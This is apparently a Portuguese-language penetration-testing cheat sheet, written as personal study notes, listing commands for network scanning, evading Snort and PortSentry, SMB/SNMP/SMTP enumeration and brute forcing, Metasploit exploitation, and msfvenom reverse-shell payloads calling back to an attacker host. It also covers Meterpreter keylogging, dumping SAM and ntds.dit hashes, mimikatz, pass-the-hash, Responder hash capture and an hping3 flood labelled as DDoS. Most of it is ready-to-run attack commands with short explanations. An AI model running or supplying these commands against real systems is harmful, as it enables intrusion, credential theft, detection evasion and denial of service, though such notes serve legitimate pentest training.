Varre toda a rede com o ICMP a fim de mostrar os hosts ativos.

    arping -c 1 192.168.2.10 

Semelhante ao ping para descobrir hosts com block ping na rede 

    arp-scan -l  

Varre os hosts já identificados

    tcpdump -vn -i wlan0 host 192.168.2.10 and 192.168.2.10  

Escuta a comunicação de dois hosts

    nmap -sn 192.168.2.10 

Varrer o hosts e saber se está ativo ou não

    nmap -sn 192.168.2.10 -oN normal.txt 

Varrer o hosts e saber se está ativo ou não e salvar em um arquivo, N normal, X xml e G grapable possibilitando usar filtros.

    nmap -sS -p 80 -Pn 192.168.2.10 --reason 

Retorna se a porta 80 está aberta ou não mostrando a razão


Nota:TCP connect envia RESET depois do 3WHS
No firewall, o certo é bloquear tudo e liberar apenas o que é necessário
Nmap em `/usr/share/nmap/scripts` É encontrado vários scripts para uso em diversos serviços.
No ping pode-se usar o `-w 1` para ser feito o ping mais rápido

    nmap -sT -p 80 site.com 

Exemplo de TCP Connect (PortScan)

    nmap -v -sTV -p 69 site.com 

Exemplo de TCP Connect Scan Port ENUMERATION - Banner Grab

    HalfOpen/Syn Scan 

Envia um RESET depois de SYN/ACK do host

    nmap -sS --top-ports=5 site.com 

Exemplo de HalpOpen

    Flags NMAP: -sF  

Envia flag FIN para o host e retorna open|filtered, Semelhante ao -sN 

    iptables -nvL 

Saída mais detalhada com o consumo de Bytes

    iptables -A INPUT -s 192.168.2.102 -j ACCEPT

Grava os pacotes de entrada do host em -s

    iptables -A OUTPUT -d 192.168.2.102 -j ACCEPT

Grava os pacotes de saída do host em -d

    iptables -Z

Zera todas os registros de Bytes gravados

    nmap -v -sU -p 69 site.com

Exemplo de UDP Connect Scan Port

    nmap -v -sUV -p 69 site.com

Exemplo de UDP Connect Scan Port ENUMERATION

    hping3 --udp -p69 192.168.2.102

Exemplo de UDP Connect Scan Port

    hping3 --flood -S -V --rand-source IP

Exemplo de DDOS com HPING3

- Network Sweeping

.

    nmap -v -sn 192.168.2.0/24 -oG ativos.txt 

Coloca os hosts UP e Down no arquivo ativos.txt

    grep "up"cut -d " " ativos.txt  | cut -d " " -f 2 > hosts 

Filtra pelos hosts UP e coloca em hosts 

    nmap -sS -p 80 --open -Pn -iL hosts -oG web.txt 

Ler hosts da lista e apresenta os com port 80 open

    nmap -sSV -p 80 --open -Pn -iL hosts -oG web.txt 

Banner grabbing das portas abertas

    grep "Apache" web.txt 

Filtro pelo serviço da porta

    nmap -sS -p 139,445 --open -Pn -iL hosts -oG share.txt 

Varre os hosts com as portas e salva em share

    nmap -sS -p 21,22,23,3389 --open -Pn -iL hosts -oG remote.txt 

Varre portas e salva em remote

    nmap -sS -p 3306,1433 --open -Pn -iL hosts -oG db.txt   

Varre portas e salva em db

    nmap -sS -p http* --open -Pn iL hosts -oG coringa.txt  

Varre portas com coringa e salva em coringa


Identificando serviços

    nmap -v -sV -Pn 192.168.1.2 

Pegando o Banner de todas as portas abertas


- Enganando o atacante

Nota: /etc/services -> mostra os serviços e as suas respectivas portas padrões

    nano etc/ssh/sshd_config 

Acessa e modifica a porta para enganar o atacante.

    sudo apt install bless 

Programa para alterar códigos em hexadecimal.

    cp usr/sbin/sshd /home/user/desktop 

Cópia de segurança do arquivo. Procura pelo banner e altera para enganar o atacante.


- OS Fingerprinting

Parâmetros que podem identificar um Windows: 

        RDP.3389-Implementação da pilha TCP/IP-NMAP -O / -A

Identificar o SO pelo TTL (caso esteja padrão)

        Win ttl 128 

        Linux ttl 64 

        FreeBSD ttl 64 

        Solaris ttl 255 

        CISCO ttl 254


- Conectando e lendo mensagens de email via comando

IMAP

	nc - v mail.servidor.com 143 

Conecta-se ao servidor de email

        A1 login usuário s3Nh4  autentica no servidor após conectado

        g21 SELECT "INBOX" 

Printa as respostas sobre a caixa de entrada

        F1 fetch 1 RFC822 

Lista a mensagem 1

        s search draft 

Procura pelos rascunhos


    curl -v imap://camila:ca123456@email.site.com.br/INBOX?NEW 

Conecta com IMAP e retorna OK da conexão com a quantidade de emails na caixa


POP 

    nc -v mail.servidor.com 110 Conecta com o servidor de email POP

        USER username - Usuário da conta

        PASS password - Senha da conta

        LIST - Lista a quantidade mensagens e o tamanho

        STAT - Apresenta as quantidade de mensagem

        RETR 1 - Ler a mensagem 1


SMTP

    nv -v 192.168.2.101 25 Conecta na porta SMTP

	HELO Lista info do servidor

        EHLO Lista comandos aceitos e mais infos do server

        HELP Lista os comando aceitáveis pelo servidor

        VRFY root Ele informa se o usuário root existe ou não

        mail from: pentest Envia email usando o servidor

        mail to: root Destinatário do email com o assunto posteriormente e com verificação de user existente

        DATA ... Digita a mensagem e finaliza com um ponto e enter


## BURLANDO MECANISMOS DE DEFESA


    NMAP -v -sS -g 53 192.168.2.10 

Encontrar Portas filtradas pelo firewall. O `-g` podendo ser trocado por `--source-port`, é a mesma coisa. Para interagir com a porta descoberta rode `nc -vn -p 53 192.168.2.10 8081`  e capture o banner! Ou podendo enviar a saída para um arquivo `> /var/www/html/recon.html`


    snort -A fast -q -h 192.168.2.0/24 -c snort.conf 

Monitorar em `tail -f alert /var/log/snort/`

    snort -A console -q -h 192.168.2.0/24 -c snort.conf 

Habilita o IDS e já monitora 


Arquivos de regras do snort

    alert tcp any any -> 192.168.2.105 any (msg: "Tão te atacando";sid:1000001; rev:1;) 

Cria arquivo com `.rules` onde o primeiro any é a origem e o segundo a porta de origem o terceiro a porta de destino o IP é da sua máquina. O path do arquivo deve ser adicionado em `snort.conf` no final.

    alert tcp any any -> 192.168.2.105 22 (msg: "Pacote SYN enviado ao SSH";flags:S;sid:1000001; rev:1;) 

Exemplo de portas específicas e filtros de flags. SYN como no setado acima.

    alert tcp any any -> 192.168.2.105 80 (msg: "Acesso ao arquivo robots.txt";content:"robots.txt";sid:1000001; rev:1;) 

Exemplo de portas específicas e filtros de conteúdos. robots.txt como no setado acima.

    alert tcp any any -> 192.168.2.105 80 (msg: "Possivel SQL Injection";content:"%27";sid:1000001; rev:1;) 

Exemplo de portas específicas e filtros de conteúdos. %27 como no setado acima.


- Bypass SNORT

Nota:Pegando o exemplo do ICMP, o SNORT captura os pacotes e alerta, o ideal é pegar o arquivo de regras no SNORT e analisar cada alerta emitida no ping.
Analisar as regras para saber como burlar as mesmas com outros mecanismos.

    ping -c1 -p "6568674124" 192.168.2.105 

Burlando os dados do pacote enviado passando hex diferente

    hping3 -c1 -C 8 -K 1 --icmp 192.168.2.105 

Burlando o código do pacote burlando a regra icode para 1

    hping3 -c1 -C 8 -K 1 -d 23 --icmp 192.168.2.105 

Burlando o tamanho dos dados para não ser detectado


PortSentry simula portas abertas no host. No `portsentry.conf` tem as portas que deseja abrir, e a ação a ser tomada quando detectado a intrusão. Marca a opção TCP e UDP como 1 para fazer valer as regras de bloqueio. Habilita ou desabilita a ação padrão ou usa a do IPTABLES

Nota: saída do banner na porta como tcpwrapped é geralmente quando tem algum IPS/IDS/FW bloqueando
Se fizer o escaneamento usando a flag do `NMAP -sS` o IPS não detecta... Para o IPS detectar deve ser modificando o binário do portsentry em `/usr/sbin/portsentry` executando com a flag `-stcp` dessa forma fazendo o atacante ser bloqueado.
Flag `nmap -T` é a velocidade das requisições 0,1,2,3,4 e 5 do mais lento para o mais barulhento.

Analisar os arquivos `hosts.deny` em ETC para ver se tem algum bloqueio de IP.

	Bypass PortSentry mesmo com -STCP ativado

    nmap -sS --open --top-ports=10 -Pn 192.168.2.105

Analisa as 10 top ports, caso uma dessas portas não esteja configurado no IPS para detectar, caso contrário irá detectar. Podendo aumentar ou diminuir o tempo de processamento do scanner com a flag `-T`. Flag `-D` (decoy), Exemplo: `nmap -sS --open --top-ports=25 -Pn -D 10.10.2.4,192.168.25.25,10.0.0.14 192.168.2.105 Ou -D RND:50` Pegando 50 endereços aleatórios para misturar


## TRABALHANDO COM SCAPY

    ls(IP)

Lista as opções customizáveis do pacote IP (TCP)

    pIP = IP(dst="192.168.2.1")

Cria variável com o ip de destino.

    pIP / pIP.show() / pIP.summary 

Lista o pacote/variável criado(a)

    pTCP = TCP(dport=80, flags="S") 

Cria o pacote TCP

    pTCP.dport=80, 443, 9090 

Adiciona mais portas ao pacote TCP

    pTCP.sport=457889 

Porta de origem no pacote TCP

    pacote = pIP/pTCP

Formando o pacote TCP/IP

    sr1(pacote)

Enviando Um pacote TCP/IP

    sr(pacote)

Enviando vários pacotes TCP/IP é o exemplo de várias portas

    resposta = sr1(pacote)

Grava em resposta a saída do envio do pacote

    resposta.show()

Mostra a variável criada

    resposta[IP].dst

Mostra o atributo dst do pacote IP

    resposta[TCP].flags

Mostra o atributo flags do pacote TCP

    resp, noresp = sr(pacote)

Grava em resp e no respe as respostas e não respostas respectiv

    pacote = pIP/ICMP()/"kidman"

Pacote ICMP com payload "kidman"

    pacote = pIP/pTCP/"KidMan"

Pacote TCP com payload "Kidman"


Nota: Requisição de conexão HTTP OPTIONS retorna os métodos de requisições aceitos pela aplicação. Na requisição colocando 1.1 no HTTP é possível especificar o HOST para ir direto ao domínio

## ENUMERATION 
Tags: Enumeração

    openssl s_client -quiet -connect www.tesla.com:443 

Faz uma conexão de forma segura com criptografia seguido do HEAD / HTTP/1.1 HOST www.tesla.com recomenda-se usar o HTTP 1.1

    wafw00f tesla.com 

Identificando o firewall que a aplicação está utilizando

    ftp host.com 

Conexão FTP com o servidor passando login e senha | anonymous anonymous, ftp ftp comando passivo habilita o modo passivo podendo listar os arquivos


Nota:	Porta 139 NetBios porta mais antiga

Porta 445 SMB serviço mais atual

- Enumerando SMB no CMD	

.

    nbtstat -A 192.168.2.101 

Retorna informações da máquina como nome, grupo etc...

    net view \\192.168.2.101 

Lista os arquivos compartilhados do host

    net use \\ 192.168.2.101 "" /u:"" 

Tenta estabelecer um NULL Session (sem user e pass) no netbios

    nbtstat -c 

Mostra o cache das buscas realizadas

    net use h: \\192.168.2.101\filename 

Monta o compartilhamento no H

    net use h: /delete 

Deleta o compartilhamento montado

    for /f %i in (wordlist.txt) do net use \\192.168.2.101 %i /u:usr 

Brute force smb no CMD

    for /f "tokens=1,2" %i in (wordlist.txt) do net use \\192.168.2.101 %j /u:%i 

Brute force smb no CMD com login e senha


- Enumerando SMB no terminal

Alternativa: nmblookup

    nbtscan -r 192.168.2.0/24

Procura por hosts com compartilhamento de arquivos ativos

    smbclient -L \\192.168.2.101

Lista os arquivos do host com smb ativo -N Loga como usuário anônimo -U para passar um usuário sem senha. Se usando uma ferramenta mais recente em hosts antigos use o parâmetro `--option='client min protocol=NT1'`

    smbcliente //192.168.2.101/filename 

Conecta diretamente ao arquivos/pasta do host


- Enumerando com RPC

.

    rpcclient -U " " -N 192.168.1.5

Serve para conectar em servidores com acesso remoto disponível

    Enumdomusers

Dentro do RPC client lista os usuários

    queryuser usuário

Dentro do RPC lista as infos do Usuário

    Netshareenumall

Lista todos os compartilhamentos

    Querydominfo

Mostra informações sobre o domínio

[Escalar Privilégios com RPCCLIENTÇ](https://www.100security.com.br/rpcclient)


Ferramenta enumeração completa ENUM4LINUX

    enum4linux -U 192.168.2.101 
	enum4linux -u user.name -p @PassWd 171.16.1.10 -w domain.local -a

Faz a enumeração em busca de usuários e `-a` para buscar por tudo e `-S` para buscar por compartilhamentos, o `-u` permite passar o usuário para autenticação.

    Linenum.sh 

[Link da ferramenta:](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)

Scripts em busca de informações e vulnerabilidades

    nmap -v --script=smb-enun-domains 192.168.2.100

Busca por domínios do host passado

    nmap -v --script=smb-vuln-ms* 192.168.2.100

Verifica se o host tem a vulnerabilidade dos scripts passados o * o curinga para ele ler todos os scripts que tenham o mesmo prefixo   


Script enumeração SMTP

            import socket, sys

            if len(sys.argv) !=3:

                    print "Modo de uso: nome do arquivo, IP e usuário"

                    sys.exit(0)

            tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            tcp.connect((sys.argv[1],25))

            banner = tcp.recv(1024)

            print banner

            tcp.send("VRFY "+sys.argv[2]+"\r\n")

            user = tcp.recv(1024)

            print user

Script enumeração SMTP bruteforce

            import socket, sys,re

            file = open("wordlist.txt")

            for linha in file:   

                        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                        tcp.connect((sys.argv[1],25))

                        banner = tcp.recv(1024)

                        tcp.send("VRFY "+linha)

                        user = tcp.recv(1024)

                        if re.search("252", user): #printa somente as linhas com o número 252

                                print "Usuário encontrado: "+user.strip("252 2.0.0") #printa ignorando o 252...

Enumeração com TELNET

    telnet 192.168.2.10 

Conecta com a porta 23 para fazer login e encontra as senhas em cirt.net/passwords e/ou datarecovery.com/rd/default-passwords


- Enumerando com SSH

.
    nc 192.168.1.1,2,5,120 22 

Captura o banner da porta e um possível SO

    ssh -v 192.168.1,2,5,120 

SSH em modo verbose com informações detalhadas informando as chaves de autenticação aceitas pelo servidor Local dos known hosts (/root/.ssh/known_hosts)


- Subindo serviço de SSH

.

    nano /etc/ssh/sshd_config 
Arquivo de configuração  podendo alterar porta padrão assim como permitir acesso de login com usuário root PermitRootLogin Yes / PublickeyAuthentication (Server)

        ssh-keygen 
Roda o comando seguido do caminho `/home/user/Desktop` na máquina que vai acessar o ssh  (Client)

    nano /etc/.ssh/authorized_keys 
Copiar os dados de `id_rsa.pub` gerado acima e cola no (Servidor)

    ssh-add id_rsa 
Adiciona a chave no host que vai conectar ao servidor ssh (Client)

	ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.35.233
Acessa o host com a chave em ambientes mais antigos


Nota: Criar usuário e colocar a chave pública dentro do servidor para ganhar acesso ao servidor ssh sem precisar da senha


- Enumerando Network File System (NFS) -P 2049

.
    
    rpcinfo -p 192.168.1.5 | grep nfs 

Enumera as informações da versão do NFS

    showmount -e 192.168.1.5 

Mostra os pontos de montagem do host

    mkdir /temp/nfs 

Cria a pasta para fazer a montagem  do diretório

    mount -t nfs -o nfsvers=2 192.168.1.5:/ /temp/nfs 
    sudo mount -v -t nfs -o vers=3,proto=tcp,nolock 192.168.1.31:/home/camila /tmp/nfs/

Monta o host disponível no caminho criado usando o ponto de montagem do host descoberto anteriormente

    cd /temp/nfs 

Vai para o diretório montado anteriormente

    umount nfs 

Desmonta o ponto de montagem do host montado anteriormente.


- Enumerando o SNMP - UDP 161

			SNMP, ou Simple Network Management Protocol, é um protocolo padrão utilizado para monitorar e gerenciar dispositivos de rede. Ele permite que os administradores de rede coletem informações, configurem dispositivos e respondam a eventos de rede remotamente. 
			Função e Componentes Principais:
			Monitoramento:
			O SNMP permite que os administradores de rede monitorem o estado e o desempenho de dispositivos, como roteadores, switches, servidores e até mesmo impressoras. 
			Gerenciamento:
			Através do SNMP, os administradores podem configurar e modificar a configuração de dispositivos remotos, bem como implementar ações de gerenciamento. 
			Base de Informações de Gerenciamento (MIB):
			As MIBs são bancos de dados que armazenam informações sobre os dispositivos e os objetos que podem ser monitorados e gerenciados através do SNMP. 
			Agente SNMP:
			Cada dispositivo que é monitorado ou gerenciado através do SNMP tem um agente SNMP que atua como um intermediário entre o dispositivo e o gerenciador de rede. 
			Gerenciador SNMP:
			O gerenciador de rede é o software ou sistema que utiliza o SNMP para monitorar e gerenciar dispositivos. 
			Como funciona:
			O gerenciador SNMP envia solicitações (por exemplo, solicitações de dados, configurações, etc.) para o agente SNMP. 
			O agente SNMP processa a solicitação e retorna as informações ou executa a ação solicitada. 
			A comunicação é realizada através do protocolo UDP, normalmente utilizando as portas 161 e 162.

Nota: Usado para gerenciamento de rede basicamente, a Communit é a palavra secreta, o OID é o id do objeto e os MIBs são as infos, instalar o pacote de informações adicionais: `apt install snmp-mibs-downloader`. Para listar os usuários usa-se `1.3.6.1.2.1.6.13.1.3`, Communitys padrões: public, private, cisco, manages, access, secret. Sites com informações relevantes alvestrand.no/objectid/1.3.6.1.2.1.html e oid-info.com

    onesixtyone -c lista.txt 192.168.1.0/24

Varre a rede em busca de serviços snmp ativos

    snmpwalk -c public -v1 192.168.1.4 1.3.6.1.4.1.77.1.2.25 

Invade o host encontrado em busca de nomes de usuários

    apt install snmp-mibs-downloader 

Instalar o pacote de informações adicionais.

    echo "" > /etc/snmp/snmp.conf 

Configura o pacote instalado anteriormente

    snmptranslate -IR sysUpTime 

Pega o Mib do UP time

    snmptranslate -Td SNMPv2-MIB::sysUpTime 

Lista detalhes do MIB descoberto no comando anterior

    snmptranslate -TB icmp 

Exibe vários tipos de MIB de acordo com a pesquisa

    snmpwalk -c public -v1 192.168.1.4 IP-MIB::icmpInEchos 

Invade o Host mostrando a quantidade de pacotes ICMP enviados a ele.

    snmp-check 192.168.1.4 -c public 

Carrega informações importantes da máquina com SNMP aberto

    snmpwalk -c manager -v1 192.168.1.247 

Acessa com o nível de administrador

    snmpset -c manager -v1 192.168.1.247 SNMPv2-MIB::sysContact.o s "KidMan" 

Altera a info de contact do serviço snmp do servidor.

    sudo hydra -P /usr/share/wordlists/metasploit/snmp_default_pass.txt 192.200.0.103 snmp

Bruteforce de community do snmp

	nc -vz -u 10.1.0.100 53

NC para conexão udp com host


- Enumeração MySQL

.

    mysql -h 192.168.1.5 -u root 

Conecta no MySQL usando o usuário root

    describe COLUMNS from <TABELA> 

Dentro do mysql descreve as tabelas

    show databases 

Dentro do mysql mostra as base de dados

    use databasename 

Dentro do mysql abre a base de dados

    show tables 

Dentro do mysql mostra a lista de tabelas da base de dados


[Site de comandos MySQL:](http://g2pc1.bu.edu/~qzpeng/manual/MySQL%20Commands.htm)


## ANÁLISE DE VULNERABILIDADES

Sites que têm exploits e informações de vulnerabilidades.

packetsormsicurity.com/files/tags/exploits

securityfocus.com/vulnerabilidades

Exploit-db.com

Cvedetails.com

nvd.nist.gov/vuln/search

Rapid7.com

Ferramentas de automação de análise de vulnerabilidades:

        Nessus - service nessusd start | stop

        OpenVas

        Qualys

        searchsploit webmin


- NMAP NSE

.

    /user/share/nmap/scripts# grep "ftp" scripts.db 

Pesquisa por script pelo nome

    /user/share/nmap/scripts# nmap -p21 --script ftp-vsftpd-backdoor.nse -Pn 192.168.2.10 

Pesquisa por vulnerabilidade com o script informado

    /user/share/nmap/scripts# nmap -p21 --script ftp-vsftpd-backdoor.nse --script-args cmd="ls -la" -Pn 192.168.2.10 

Executa argumentos para validação da vulnerabilidade

    /user/share/nmap/scripts# nmap -p21 --script ftp-anon.nse -Pn 192.168.1.108 

Procurando por vulnerabilidade de FTP com usuário anônimo

    /user/share/nmap/scripts# nmap -p80 --script http-shellshock --script-args uri=/sgi-bin/test.cgi,cmd=ls 192.200.0.108

Executando o script com argumentos após a varredura do host e descobrir o caminho test.cgi


Nota: Shadow Brokers do Nessus para busca por vulnerabilidades de 2017 publicadas pelo shadow brokers.


## METASPLOIT FRAMEWORK


    systemctl start postgresql 

Iniciar o banco de dados para ser usado pelo msfconsole

    msfdb init 

Iniciar o banco de dados do metasploit

    searchsploits proftp 

Procura por exploits dentro do metasploit

    use auxiliary/scanner/portscan/tcp 

Usa o auxiliar para fazer portscan

    back 

Sai do auxiliar/exploit que você estava usando

    search type:auxiliary|exploit portscan|snmp|smb|rdp 

Procura por tipo e termo informado facilitando o uso da ferramenta

    services 

Mostra o que já foi descoberto/feito nos host (somente se estiver com a base de dados ativa)

    services -p21 

Exibe a porta já encontrada

    db_nmap -v --open -sS  -Pn 192.168.1.7 

Roda o Nmap dentro do MSF

    nmap -v --open -sV  -Pn 192.168.1.4 -oX /opt/host4.xml

Nmap com output xml para importar no MSF

    db_import /opt/host4.xml 

Importa o xml criado fora do ambiente

    hosts 

Mostra todos os host encontrados na base do MSF

    vulns 

Verifica se há algum host com vulnerabilidades

    use auxiliary/scanner/ssh/ssh_login 

Usado para bruteforce de password ssh

    sessions 

Lista as sessões ativas no momento

    sessions -i 1 

Entra na sessão 1 informada pelo comando anterior

    creds 

Mostra as credenciais salvas durante o pentest

    use auxiliary/scanner/smb/smb_version 

Auxiliar para enumerar a versão do smb em busca de informações detalhadas

    services -p 445 --rhosts 

Adiciona ao auxiliar/exploit os hosts daquela porta informada

    hosts -i "informacao-a-ser-adicionada" 192.168.1.10 

Adiciona informação faltante do host

    search type:exploits samba 

Procura por exploits para pentest em Samba

    search type:exploits fullname:"Samba x.x.x.x" 

Procura por nome e versão 

    use auxiliary/scanner/smb/smb_ms17_010 

Informa se o host é vulnerável ou não

    use exploit/multi/samba/usermap_script 

Exploit para explorar vulnerabilidade do Samba no Linux

    show payloads 

Mostra os diferentes payloads disponíveis para o exploit usando no momento


Nota: Usar o payload Meterpreter habilitará funções adicionais.
Payloads com _ são mais simples e payloads com / são do tipo staged, mais funcionalidades. Arquivos do tipo POST são de pós exploração para por exemplo abrir porta RDP na vítima.

    nmap --open -p 445 --script=vuln -Pn 

Procura por vulnerabilidades com os scripts do NMAP

    search rdp 

Encontra os módulos RDP e use para abrir uma porta rdp no alvo 

    xfreerdp /u:user@domain.com /v:192.168.2.11 

Conectar com RDP em modo gráfico

    rdesktop

Alternativa para o xfreerdp

    remmina

Alternativa para o rdesktop


Comandos para rodar no Meterpreter do windows

    background 

No msf deixa a sessão em standby para voltar para a shell novamente mais tarde

    PS

Mostra os processos atuais

    execute -f notepad

Abre um programa

    sysinfo

Mostra as infos do sistema

    download local/do/arquivo

Baixa um arquivo

    upload local/do/arquivo

Faz o upload de um arquivo

    keyboard_send "nao se esconda"

Envia um comando ao teclado

    keyscan_start

Começa a escutar o teclado

    key_scan dump

Faz um dump do teclado


- Comandos para uso no Msfvenom e Metasploit

.

    exploit/linux/http/ipfire_oinkode_exec 

Exploit para firewall IPFIRE com autenticação

    auxiliary/scanner/http/http_login

Auxiliar para brute force de logind http

    Msfvenom

Ferramenta usada para desenvolver exploit, shell

    msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.16 lport:443 -f exe -o shellkidman.exe 

Criar Exploit em EXE

    use exploit/multi/handler (add host and door) 

Usa o exploit genérico para ter shell com o exploit criado

    set payload windows/x64/meterpreter/reverse_tcp 

Seta payload do exploit criado

    python -m SimpleHTTPServer 80 

Abre servidor php para download de arquivos

    exploit -j 

Cria jobs para acessar novamente tipo sessions

    jobs 

Lista os jobs criados com o exploit -j. O -K mata todos os jobs

    msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.0.16 lport:443 -f war -o kidman.war 

Cria exploit em war

    msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.16 lport:443 -f raw > kidman.php 

Cria exploit em php


Nota: Solução Lab KidMan Metasploit:

        https://absolomb.com/2018-02-24-HackTheBox-Matis-Writeup 
        porta serv kerberos
    	ldapsearch --help 
	Vasculha LDAP service do host passado


## HASHES E SENHAS - LINUX


    echo -n "kidman" | md5sum or | sha512sum or | sha256sum | sha1sum 

Codifica uma palavra em uma hash

    md5sum arquivo.exe 

Verifica o MD5 do arquivo passado

    bless arquivo.exe 

Ler e modifica um arquivo

Hash com Python: 

        Import Hashlib.md5("KidMan").hexdigest()
        Import base64.b64encode("kidman")
        Import base64.b64decode("kidman")
.

    hashid hashhere 

Ferramenta de identificação de hashes 

    hash-identifier hashhere 

Ferramenta de identificação de hashes 

[Site de quebra de Hashes:](https://md5decrypt.net) [Altermativo](http://hashes.com)

Ferramenta de quebra de hashes	

        john
        hashcat
.

    openssl passwd -6 -salt c4r4c73res senha123 

Cria Hash do tipo 6 com salt (For more search, man crypt https://man.archlinux.org/man/crypt.5.en)

    for i in $(cat wordlist.txt);do echo -n $i " "; echo -n $i | md5sum;done > rainbow_tables

Função Bash para inserção de hash em wordlists

    /etc/shadow 

Arquivo de hashes de senhas dos usuários do linux

    unshadow /usr/passwd /usr/shadow > hashes 

Deixa o hash pronto para rodar no John the Ripper


Nota: Tipo de hash das senhas do linux: CRYPT

	One Way ex.: sha256
	Two Way ex.: base64

[Compilador alternativo portável GCC:](https://bellard.org/tcc/)


[GLIBC_Compiling](https://www.linkedin.com/pulse/compiling-exploits-old-machines-chance-johnson)

loncrack: Ferramenta do Longatto para quebra de hashes

        gcc loncrack.c -lcrypt -o loncrack 

Após baixar do GitHub compilar e executar


Script para quebra de senhas em Python

	import crypt
	salt = "taltal"
	senha = "asdasd"
	crypt.crypt(senha,salt)

.

    exploit/linux/samba/is_known_pipename 

Exploit para samba em linux v3 e 4 e se der erro de encriptação, rodas os comando seguintes

        set smb::alwaysencrypt false  Seta a encrypt para falso
        set smb::protocolversion 1 Seta a versão para 1

Referências:

        https://www.whitehat.de/msf-metasploit-rubysmb-error-encryptionerror-communication-error-with-the-remote-host
        https://www.youtube.com/watch?v=JML84NJqnQU

Site para download de Wordlists 'dicionario', WL indicada `dicassassin` [WeakPass](https://weakpass.com/wordlist/big)

Comando para montar 'montando' uma lista de user:pass wordlist dicionario userpass `paste -d: dicionario1.txt dicionario2.txt > dicionario_combinado.txt`

## HASHES E SENHAS - WINDOWS


    %systemRoot%/system32/config/sam 

Local do arquivo de contas de suarios

    %systemRoot%/ntds/ntds.dit 

Local dos arquivos de usuários do AD

    %systemRoot%/system32/config/system 

Arquivo necessário para decriptar o sam

Obs.:Todos são bloqueados por execução e precisam de acesso administrativo

    c:/windows/repair 

Local de backup desses arquivos (xp e 2003) possivelmente está desatualizado

    reg save hklm\sam sam 

Salva o arquivo SAM do Reg do Win (root) all version

    reg save hklm\system system 

Salva o arquivo System do Reg do Win (root) all version

    vssadmin 

Cópia de sombra de volume


Nota: Exploit/windows/smb/ms08_067_netapi RHOST 192.168.1.4 

Exploit de vulnerabilidade smb no XP

    meterpreter> hashdump2 

Captura as hashes dos usuários do sistema

    samdump2 system sam 

Captura/monta as hashes dos usuarios (unshadow)

    impacket-secretsdump -sam sam -system system LOCAL

Faz o mesmo que o samdump2


msf6> search UAC: Os dois melhores…

        exploit/windows/local/ask 

Precisa da confirmação de usuário e de uma SESSION aberta para funcionar

        exploit/windows/local/bypassuac_fodhelper 

Usa a SESSION mas não precisa da confirmação do user


Nota: exploit-Windows-Eternalblue-win8 RHOST 192.168.1.233

- Explorando o AD
.

[Ferramenta enumeração Active Directory -BLOODHOUND-](https://github.com/BloodHoundAD/BloodHound)

	sudo apt install bloodhound
	sudo console neo4j
 	http://localhost:7474/browser/
	bloodhound
	-> NO ALVO
	powershell -ep bypass
	..\Downloads\SharpHound.ps1
	Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip 
	-> COPIA o arquivo LOOT.ZIP gerado para o BLOODHOUND
.

    vssadmin list volumes 

Lista os volumes para fazer a cópia

    vssadmin create shadow /for=c: 

Cria uma cópia do c:

    copy //nameCopiaSombra/windows/ntds/ntds.dit c:/ntds.dit 

Acessa a copia e copia o arquivo ntds do AD

    copy //nameCopiaSombra/windows/system32/config/system c:/system 

Acessa a copia e copia o arquivo system

    impacket-secretsdump -ntds ntds.dit -system system LOCAL 

Mostra as hashes das contas de usuários do AD


- Quebrando senhas

.

    john --format=lm hashesLM --show 

Quebra senha formato LM com Brute

    john --format=nt hashesNTLM --show 

Quebra senha formato LM com Brute


- Senhas em cache

.

    cd /usr/share/windows-binaries 

Contém executáveis do windows para exploração

    meterpreter> upload usr/share/windows-binaries/fgdump/fgdump.exe  c:/fgdump.exe 

Upload para a vítima para gerar os hashes em cache

    shell: fgdump.exe 

Ele gerará dois arquivos cachedump e pwdump

    meterpreter> upload usr/share/windows-binaries/wce/wce-universal.exe c:/wce-universal.exe 

Faz o upload do WCE para a vítima p/ quebra de senhas

    shell:wce-universal.exe -w 

Traz as senhas em texto claro

    meterpreter> load mimikatz 

Carrega o módulo do meterpreter para quebra de senhas (Substituído pelo KIWI)

    Wdigest

Quebra as senhas usando o mimikatz

    mimikatz-command 

Comando proprio do proprio mimikatz

    mimikatz-command -f sekurlsa::wdigest -a full 

Quebra as senhas do alvo

    mimikatz-command -f sekurlsa::logonPasswords 

Quebra as senhas dos usuários de logon

Usando as credenciais

    smbclient -L \\192.168.1.60 -U rogerio -W dominio
    smbclient -l //192.168.1.60/dados -U rogerio -W dominio
    xfreerdp /v:192.168.1.60 /u:rogerio /p:password

- Obtendo Credenciais pela rede

.

impacket-secretsdump user:senha@ip 

Se conectará ao ip com as credenciais e varrerá a vítima em busca de outras credenciais/hashes


- Subindo CMD com credenciais do Windows

.

    winexe -U user%password //192.168.1.60 cmd.exe 

Conseguir a shell do alvo usando credenciais válidas


NOTA: exploit/windows/smb/psexec, payload-x64-rev_tcp RHOST 192.168.1.60 para conseguir uma shell no alvo usando credenciais do AD no smb.
Pesquisar UAC no metasploit encontra exploit para pegar admin/privesc no windows com usuário comum usando uma sessão ativa no metasploit

    wce64.exe -w 

Executar no alvo o WCE64 dos resources do windows localizadas no kali e fazer a enumeração das hashes

    pth-winexe -U rogerio%hashencontrado //192.168.1.60 

Autentica usando a hash encontrada, o mesmo pode ser feito no exploit psexec PassTheHash


- Ferramenta completa de enumeração SMB

.

    apt install crackmapexec
.

    crackmapexec smb 192.168.1.0/24 

Procura por hosts e faz a enumeração do smb automaticamente

    crackmapexec smb 192.168.1.0/24 -u rogerio -p 'password' 

Faz a varredura e diz o que dá para fazer ou não usando as credenciais passadas

    crackmapexec smb 192.168.1.0/24 -u /usr/share/wordlists/users/txt  -p /usr/share/wordlists/users/txt --no-buteforce

Faz um bruteforce do tipo pitchfork

    crackmapexec smb 192.168.1.0/24 --users

Faz a varredura e diz os usuarios possiveis dever

    crackmapexec smb 192.168.1.60 -u rogerio -p 'password' -X  'ipconfig /all' 

Roda um comando no alvo e traz a saída. O -L lista os módulos e o -h apresenta o Help

    responder 

Ferramenta de escuta para falsificar respostas feitas na rede e capturar hashes

    responder -I eth0 -Prv 

Escuta de forma a capturar hashes wireshark de hashes. -r para habilitar as respostas netbios e -v para verbose

    hashcat -m 5600 arquivodahash /wordlist/pass.txt 

Quebra a senha encontrada

